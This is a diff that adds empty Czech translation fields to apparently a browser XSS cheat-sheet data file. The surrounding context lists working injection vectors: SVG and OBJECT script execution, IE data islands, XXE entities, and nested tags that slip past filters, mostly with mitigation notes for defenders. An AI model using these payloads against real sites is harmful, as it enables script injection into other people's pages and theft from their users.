             'en' : 'Internet Explorer allows to use right curly brace (}) as a group separator. A CSS declaration in quirks mode may consist of a property name, followed by a symbol of equality (=).',
             'ja' : '',
             'ru' : 'Internet Explorer разрешает использовать правую фигурную скобку (}) в качестве группового разделителя. В режиме совместимости css-декларация также может содержать имя свойства, за которым следует знак равенства (=).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1399,6 +1536,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },            
         'browsers'   : {
@@ -1414,6 +1552,7 @@ var items =
             'en' : 'SVG file executing JavaScript via <SCRIPT> tag',
             'ja' : '',
             'ru' : 'Исполнение JavaScript в SVG в теге <SCRIPT>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
@@ -1421,6 +1560,7 @@ var items =
             'en' : 'SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction',
             'ja' : '',
             'ru' : 'SVG-файлы могут заключать в себе обычные теги <SCRIPT>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1428,6 +1568,7 @@ var items =
             'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
             'ja' : '',
             'ru' : 'SVG-файлы не должны рассматриваться в качестве изображений - особенно, когда дело касается загрузки. SVG-файл может содержать произвольные данные HTML, а также обработчики событий в собственных элементах.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1446,6 +1587,7 @@ var items =
             'en' : 'JavaScript execution via <SCRIPT> for and event attributes',
             'ja' : '',
             'ru' : 'Использование атрибутов for и event в теге <SCRIPT>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<SCRIPT FOR=document EVENT=onreadystatechange>%js_alert%</SCRIPT>',
@@ -1453,6 +1595,7 @@ var items =
             'en' : 'Opera and Internet Explorer allow using <SCRIPT> tags with "for" and "event" attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction.',
             'ja' : '',
             'ru' : 'Opera и Internet Explorer поддерживают атрибуты for и event, с помощью которых можно привязать JavaScript-код к событию в конкретном объекте. В приведенном примере эти два атрибута приводят к автоматическому исполнению кода.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1460,6 +1603,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1476,6 +1620,7 @@ var items =
             'en' : 'JavaScript execution via <OBJECT> DataURL attribute',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью параметра DataURL тега <OBJECT>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="%js_uri_alert%"></OBJECT>',
@@ -1483,6 +1628,7 @@ var items =
             'en' : 'Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the "dataurl" attribute of a TDC Object. The JavaScript will be executed without user any interaction.',
             'ja' : '',
             'ru' : 'Internet Explorer 9 и в некоторых случаях меньшие версии поддерживают псевдоскрипт для параметра DataURL тега <OBJECT>, что повлечет исполнение JavaScript без участия пользователя.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model'],
@@ -1490,6 +1636,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1505,6 +1652,7 @@ var items =
             'en' : 'JavaScript execution via <OBJECT> data',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью атрибута data тега <OBJECT>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<object data="data:text/html;base64,%js_base64_alert%">',
@@ -1512,6 +1660,7 @@ var items =
             'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <OBJECT> "data" attribute value - even if base64 encoded.',
             'ja' : '',
             'ru' : 'Почти все браузеры, поддерживающие протокол data, исполняют JavaScript с помощью атрибута data тега <OBJECT>, который в приведенном примере кодирован в base64.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1519,6 +1668,7 @@ var items =
             'en' : 'Make sure user submitted HTML cannot contain <OBJECT> tags or only whitelisted <OBJECT> "data" values.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательская разметка не содержит тег <OBJECT> , или допускаются только такие параметры атрибута data, которые занесены в белый список.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1537,6 +1687,7 @@ var items =
             'en' : 'JavaScript execution via <EMBED> src',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью атрибута src тега <EMBED>',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<embed src="data:text/html;base64,%js_base64_alert%">',
@@ -1544,6 +1695,7 @@ var items =
             'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
             'ja' : '',
             'ru' : 'Почти все браузеры, поддерживающие протокол data, исполняют JavaScript с помощью атрибута src тега <EMBED>, который в приведенном примере кодирован в base64. Только Firefox безуспешно попытается найти плагин-обрабочкик.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1551,6 +1703,7 @@ var items =
             'en' : 'Make sure user submitted HTML cannot contain <EMBED> tags or only whitelisted <EMBED> "src" values.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательская разметка не содержит тег <EMBED> , или допускаются только такие параметры атрибута src, которые занесены в белый список.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1568,6 +1721,7 @@ var items =
             'en' : 'Internet Explorer Scriptlets executing JavaScript',
             'ja' : '',
             'ru' : 'Исполнение JavaScript через скриптлеты в Internet Explorer',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x style="behavior:url(%sct_path%)">',
@@ -1582,6 +1736,7 @@ var items =
             'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
             'ja' : '',
             'ru' : 'Помимо htc-файлов Internet Explorer поддерживает скриптлеты в качестве альтернативного метода связи с островками XML-данных. При использовании приведенного примера JavaScript будет исполнен без взаимодействия с пользователем.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx', 'http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
@@ -1589,6 +1744,7 @@ var items =
             'en' : 'Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.',
             'ja' : '',
             'ru' : 'Пользователи не должны иметь возможность добавлять стили или HTML, содержащиий атрибут style. Если такие возможности необходимы, убедитесь, что свойство behavior не занесено в белый список.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1604,6 +1760,7 @@ var items =
             'en' : 'Internet Explorer Data Islands executing JavaScript',
             'ja' : '',
             'ru' : 'Исполнение JavaScript, используя островки XML-данных в Internet Explorer.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<xml id="xss" src="%htc_path%"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
@@ -1618,6 +1775,7 @@ var items =
             'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
             'ja' : '',
             'ru' : 'В данном примере тег <XML> используется для вынесения опасного кода во внешний источник. В теге <LABEL> часть этого кода, ограниченная тегом <payload>, связывается с HTML и затем автоматически выполняется.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
@@ -1625,6 +1783,7 @@ var items =
             'en' : 'Users should not be able to submit HTML containing <XML> tags. If necessary make sure the "dataformatas" and "datasrc" attributes are not whitelisted.',
             'ja' : '',
             'ru' : 'Пользователи не должны иметь возможность внедрять разметку, содержащую тег <XML>. Дополнительно убедитесь, что атрибуты dataformatas и datasrc не занесены в белый список.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1640,6 +1799,7 @@ var items =
             'en' : 'Self-hijacking JSON literals',
             'ja' : '',
             'ru' : 'Самозахватывающий JSON-литерал',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script>[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]</script>',
@@ -1647,6 +1807,7 @@ var items =
             'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
             'ja' : '',
             'ru' : 'Даже в случае, если часть JSON-литерала будет подконтрольна пользовательскому вводу, существует риск автоматического получения значений в т.ч. последующих членов объекта.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1654,6 +1815,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1671,6 +1833,7 @@ var items =
             'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag (1)',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью тегов <VIDEO> и <SOURCE> (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<video><source onerror="%js_uri_alert%">',
@@ -1678,6 +1841,7 @@ var items =
             'en' : 'Opera 10.5+ and Chrome allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags',
             'ja' : '',
             'ru' : 'Вектор демонстрирует возможность вызова события error в теге <SOURCE>, инкапсулируемом тегом <VIDEO> в браузерах Opera 10.5+ и Chrome. Сказанное действительно и для тега <AUDIO>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1685,6 +1849,7 @@ var items =
             'en' : 'Make sure user submitted <SOURCE> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательский тег <SOURCE> не может содержать обработчики событий.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1701,6 +1866,7 @@ var items =
             'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag (2)',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью тегов <VIDEO> и <SOURCE> (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<video onerror="%js_uri_alert%"><source>',
@@ -1708,6 +1874,7 @@ var items =
             'en' : 'Firefox 3.5+ allows error handlers in <VIDEO> tags when applied with a <SOURCE> tag. The same works for <AUDIO> tags',
             'ja' : '',
             'ru' : 'Firefox 3.5+ запускает обработчик события в теге <VIDEO>, используемом совместно с тегом <SOURCE>. То же самое для тега <AUDIO>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1715,6 +1882,7 @@ var items =
             'en' : 'Make sure user submitted <AUDIO> and <VIDEO> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательские теги <AUDIO> и <VIDEO> не могут содержать обработчики событий.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1731,6 +1899,7 @@ var items =
             'en' : 'Tags nested in other tags to trick filters',
             'ja' : '',
             'ru' : 'Вложенные теги как способ обхода фильтров',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<b <script>%js_alert%</script>0',
@@ -1738,6 +1907,7 @@ var items =
             'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
             'ja' : '',
             'ru' : 'Использование вложенных тегов (тегов, которые закрываются открытием других тегов, при этом оставаясь взаимо функционирующими) разрешено в Chrome, Firefox и Safari указанных версий. При этом в каждом из браузеров вложенные теги имеют/имели свои особенности. Так, например, только Safari позволяет зактыть пустой закрывающий тег вложенным (</ <script>...).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1745,6 +1915,7 @@ var items =
             'en' : 'This vector is ideal to trick regular expression based HTML filters and sanitizers. Make sure your filters are aware of the fact that some user agents evaluate <b <script> while others will prefer <b><script>.',
             'ja' : '',
             'ru' : 'Данный вектор идеален при обходе регулярных выражений HTML-фильтров. Убедитесь, что ваши фильтры учитывают тот факт, что некоторые пользовательские агенты рассматривают вложенные теги в качестве самосоятельных тегов.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1762,6 +1933,7 @@ var items =
             'en' : 'E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
             'ja' : '',
             'ru' : 'Использование E4X для одновременного закрытия дескрипторов и создания объекта.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<b><script<b></b><alert(1)</script </b>',
@@ -1769,6 +1941,7 @@ var items =
             'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
             'ja' : '',
             'ru' : 'В данном примере показано, что Firefox позволяет закрывать дескриптор, создавая при этом новый E4X-объект (<b></b>). В дальнейшем этот объект дополнительно сравнивается оператором < с результатом вызова функции alert - таким образом обеспечивается выполнение JavaScript.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
@@ -1776,6 +1949,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1791,6 +1965,7 @@ var items =
             'en' : 'XSS using accent grave when copying innerHTML (1)',
             'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
             'ru' : 'XSS, используя обратные апострофы при копировании с помощью innerHTML (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div id="div1"><input value="``onmouseover=%js_alert%"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
@@ -1798,6 +1973,7 @@ var items =
 			'en' : 'Internet Explorer treats the accent grave (`) as an attribute delimiter like \" and \'. The quotation mark (") will be stripped from the attribute value when using the innerHTML property in case it doesn\'t contain space.',
             'ja' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
             'ru' : 'Пример наглядно показывает, как при копировании разметки с помощью innerHTML браузер Internet Explorer убирает ограничитель параметра value (в приведенном примере - "), если он не содержит пробельных символов. При этом происходит выход за пределы первоначального параметра, приводящий к исполнению JavaScript при последующей вставке кода.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#97','#98'],
@@ -1805,6 +1981,7 @@ var items =
             'en' : 'Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja).',
             'ja' : '',
             'ru' : 'Убедитесь, что HTML-фильтр, который вы используете, рассматривает обратные апострофы в качестве ограничителя атрибута для IE и исходит из этого особенно тогда, когда пользователю разрешено использовать безопасный JavaScript (JSReg, Google Caja).',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1820,6 +1997,7 @@ var items =
             'en' : 'Obfuscation css-properties and values via ignored extra characters',
             'ja' : '',
             'ru' : 'Обфускация css-свойств и значений с помощью игнорируемых дополнительных символов',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style="[a]color[b]:[c]red">XXX</div>',
@@ -1827,6 +2005,7 @@ var items =
             'en' : '[a] Extra characters* ignored before property names (excluding backslash (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-strings\n\n[b] Extra characters ignored between property names and colon.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red)\n\n[c] Extra characters ignored before values\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n* These are given in decimal codes.\n** Ignored only before first property names.',
             'ja' : '',
             'ru' : '[a] Дополнительные символы*, игнорируемые до имени свойства (за исключением обратного слеша (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-строки\n\n[b] Дополнительные символы, игнорируемые между именем свойства и двоеточием.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (режим совместимости): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (режим совместимости): CSS-строки, буквенно-цифровые последовательности после небуквенно-цифровых символов (color,foo:red)\n\n[c] Дополнительные символы, игнорируемые перед значениями.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n*Приведены десятичные коды соответствующих символов.\n**Игнорируется только перед первым именем свойства.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1834,6 +2013,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1853,6 +2033,7 @@ var items =
             'en' : 'CSS-encoding and escaping',
             'ja' : '',
             'ru' : 'CSS-кодирование и добавление обратного слеша',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX',
@@ -1867,6 +2048,7 @@ var items =
             'en' : '[a] Encoding.\n\nThere are only three tricks to encode characters.\n[1] You can change the number of zeros: \\0A -> \\00000A \n[2] You can change the capital letter: \\0A -> \\0a \n[3] You can change the whitespace* accepted as delimiters after the encoded character.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,32\nFirefox, Google Chrome, Internet Explorer, Safari: 13\nInternet Explorer: 11,160,8192-8203,12288,65279\n\nProperties in IE may contain encoded null-character (\\0).\nThe volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation.\n\n[b] Escaping.\n\nIn addition, you can put a backslash before the character. Note: in CSS-strings \\x == x, but \\n != n\nIn FF You can put a backslash before the newline-characters: co\\&#x0Dl\\&#x0Aor:r\\&#xD&#xA;ed \nOption of writing a null-character in Internet Explorer is escaping of any whitespace-character accepted as delimiters: col\\&#160or:red \n\nOf course, these methods can be combined with other encoding and obfuscation (for example, change case of original characters).\n\n* These are given in decimal codes.',
             'ja' : '',
             'ru' : '[a] Кодирование.\n\nСуществуют всего три приёма, которые можно использовать при CSS-кодировании.\n[1] Вы можете изменять число нулей: \\0A -> \\00000A \n [2] Вы можете менять регистр символов: \\0A -> \\0a \n [3] Вы можете менять пробельный символ*, рассматриваемый в качестве разделителя, после закодированного символа.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,32\nFirefox, Google Chrome, Internet Explorer, Safari: 13\nInternet Explorer: 11,160,8192-8203,12288,65279\n\n Свойства в IE могут содержать закодированный нулевой символ (\\0).\nВажно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации.\n\n[b] Эскейпинг.\n\nКроме того, вы можете добавлять перед символами обратные слеши. Внимание: в CSS-строках \\x == x, но \\n != n \n В FF вы можете эскейпировать символы перевода строки и/или возврата каретки: co\\&#x0Dl\\&#x0Aor:r\\&#xD&#xA;ed \n Эскейпирование любого пробельного символа, рассматриваемого в качестве разделителя при CSS-кодировании, является вариантом написания нулевого символа для IE : col\\&#160or:red \n\nРазумеется, можно сочетать эти приемы с другим кодированием и обфускацией (например, с изменением регистра первоначальных символов).\n\n* Ниже они приведены в десятичных кодах.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
@@ -1874,6 +2056,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1891,6 +2074,7 @@ var items =
             'en' : 'Simulating attribute in IE',
             'ja' : '',
             'ru' : 'Симуляция атрибута в IE',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
@@ -1898,6 +2082,7 @@ var items =
             'en' : 'This vector is simulated using in IE a single quote as an attribute to trick filters',
             'ja' : '',
             'ru' : 'Этот вектор симулирует использование в IE одиночной кавычки в качестве атрибута, чтобы обмануть фильтры.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#102', '#108'],
@@ -1905,6 +2090,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1920,6 +2106,7 @@ var items =
             'en' : 'JavaScript execution via src attribute',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью атрибута src',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<embed src="%js_uri_alert%">\r\n<img src="%js_uri_alert%">\r\n<image src="%js_uri_alert%">\r\n<script src="%js_uri_alert%">',
@@ -1927,6 +2114,7 @@ var items =
             'en' : 'Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.',
             'ja' : '',
             'ru' : 'Большинство браузеров поддерживают псевдоскипт в атрибуте src тега <IFRAME> - и это ожидаемое поведение. Кроме того, некоторые их них могут исполнять JavaScript в атрибуте SRC также других тегов - однако такие возможности имеют тенденцию к снижению. В Opera 10.5+ уже не поддерживается псевдоскрипт в тегах <IMG> и <EMBED>.  ',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -1934,6 +2122,7 @@ var items =
             'en' : 'Make sure "src" attributes can never contain non-HTTP-URLs to prevent XSS or worse.',
             'ja' : '',
             'ru' : 'Убедитесь, что атрибут src пользовательской разметки не может содержать URL, не начинающийся "http://".',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1953,6 +2142,7 @@ var items =
             'en' : 'Arbitrary payload injection via XML External Entities (XXE)',
             'ja' : '',
             'ru' : 'Инъекция удаленного кода через внешний XML-эквивалент.',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<!DOCTYPE x[<!ENTITY x SYSTEM "%xxe_path%">]><y>&x;</y>',
@@ -1967,6 +2157,7 @@ var items =
             'en' : 'Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML.',
             'ja' : '',
             'ru' : 'Chrome и Safari разрешают использовать внешние ссылки на источники, которые определяют XML-эквиваленты. Это приводит к тому, что в данном примере эквивалент &x; заполняется содержимым внешнего файла. Документ должен быть отдан в качестве XML или XHTML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://xmlwriter.net/xml_guide/entity_declaration.shtml', 'http://www.w3.org/TR/REC-xml/', '#67', '#76'],
@@ -1974,6 +2165,7 @@ var items =
             'en' : 'In case an attacker can inject data into the DOCTYPE area of the targeted website it\'s easy to fool filtering mechanisms since the actual payload is hidden in a harmless looking entity. Make sure no injections in that area are possible.',
             'ja' : '',
             'ru' : 'В случае, если атакующий может внедрять данные в область DOCTYPE целевого сайта, создается возможность простейшего обхода механизма фильтрации, поскольку полезная нагрузка скрывается за безопасным на первый взгляд эквивалентом. Убедитесь, что инъекции невозможны в данной области.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -1990,6 +2182,7 @@ var items =
             'en' : 'SVG element allows automatic execution of onload attribute without other SVG elements.',
             'ja' : '',
             'ru' : 'SVG-элементы и обработчик onload',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg onload="%js_uri_alert%" xmlns="http://www.w3.org/2000/svg"></svg>',        
@@ -1997,6 +2190,7 @@ var items =
             'en' : 'SVG tags allow code to be executed with onload without any other elements.',
             'ja' : '',
             'ru' : 'SVG-элемент поддерживает атрибут onload, позволяющий автоматически выполнить JavaScript в отсутствие любых других элементов. Данный обработчик поддерживается большинством SVG-элементов. Чтобы увидеть их полный список обратитесь к приведенной документации.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html'],
@@ -2004,6 +2198,7 @@ var items =
             'en' : 'Not really a bug to fix, this is desired behaviour and only increases XSS scope.',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2022,6 +2217,7 @@ var items =
             'en' : 'Opera XML-stylesheets executing JavaScript (2)',
             'ja' : '',
             'ru' : 'Вызов javascript из тега xml-stylesheet в Opera',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>',
@@ -2029,6 +2225,7 @@ var items =
             'en' : 'Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
             'ja' : '',
             'ru' : 'Opera поддерживает загрузку xml-таблицы стилей с помощью data-схемы. Существует очень много способов выполнить javascript, используя XSL (XSLT). Если вы разместите приведенный код таблицы стилей во внешнем файле, расположенном на том же домене, то он cработает во всех браузерах. Допустимо также обращение к коду таблицы стилей посредством идентификатора (href="#xss"), если таблица стилей внедрена в текущий документ.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2036,6 +2233,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2053,6 +2251,7 @@ var items =
             'en' : 'XML ATTLIST declaration causing JavaScript execution',
             'ja' : '',
             'ru' : 'XML ATTLIST декларация влечет исполнение JavaScript',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<!DOCTYPE x [\r\n\t<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "%js_alert%">\r\n]><img />',
@@ -2060,6 +2259,7 @@ var items =
             'en' : 'XML ATTLIST declarations can be used to create attributes and assign values for matching tags inside the DOCTYPE declaration. By chosing the right namespace and attribute combinations it\'s possible to create an ATTLIST declaration causing JavaScript execution without user interaction.', 
             'ja' : '',
             'ru' : 'XML-декларация списка атрибутов (ATTLIST declaration) - еще один вариант использования возможности влиять на DOCTYPE в xml-документе. Такие инъекции имеют практическое значение в тех случаях, когда пользователям предоставлена возможность загружать определенные файлы на сервер, подвергающиеся фильтрации. В данном примере мы видим, определение атрибутов, которые появляются у тега по умолчанию при его дальнейшем использовании.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://xmlwriter.net/xml_guide/attlist_declaration.shtml', '#64', '#76'],
@@ -2067,6 +2267,7 @@ var items =
             'en' : 'In case a website is being delivered as XML or XHTML make sure an attacker has no possibility to inject data into the DOCTYPE or create new ATTLIST directives.',
             'ja' : '',
             'ru' : 'В случае, если страница отдается сервером как XML или XHTML, убедитесь, что атакующий не может внедрять данные в область DOCTYPE.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2085,6 +2286,7 @@ var items =
             'en' : 'Passive JavaScript execution via XLinks',
             'ja' : '',
